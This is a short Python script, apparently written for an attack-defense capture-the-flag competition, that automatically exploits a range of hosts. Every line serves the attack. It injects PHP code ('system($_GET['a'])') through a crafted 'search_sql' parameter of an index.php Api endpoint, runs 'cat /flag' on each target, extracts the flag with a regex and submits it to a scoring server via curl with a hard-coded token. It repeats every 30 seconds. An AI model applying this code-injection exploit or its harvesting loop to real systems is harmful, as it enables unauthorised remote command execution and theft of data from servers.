import requests
import re
import os
from time import sleep
from urllib import parse

url = 'http://172.16.5.{}:5076/index.php?c=Api&m=html&name=search&format=html&params=%7B%20%22search_sql%22:%22%20action=cache%20name=block.L]=system(%27$_GET[%27a%27]%27);%26$cache[L%22%7D&a=cat%20/flag'
# url = 'http://172.16.9.30/index.php'
post_url = 'https://172.16.4.1/Common/awd_sub_answer'
token = 'e7a8b2d8e7356e5b1e9eacd358201654'

while True:
    cnt = 0
    for i in range(10, 72):
        print('i={}'.format(i))
        try:
            rrl = url.format(i)
            s = requests.session()
            s.get(rrl, timeout=(1, 1))

            r = s.get(rrl, timeout=(1, 1))
            flag = re.search('........-....-....-....-............', r.text).group()
            os.system('curl -k {} -d "token={}&answer={}"'.format(post_url, token, flag))
            print(flag)
            cnt += 1
        except Exception as e:
            print(e)
    print(cnt)
    sleep(30)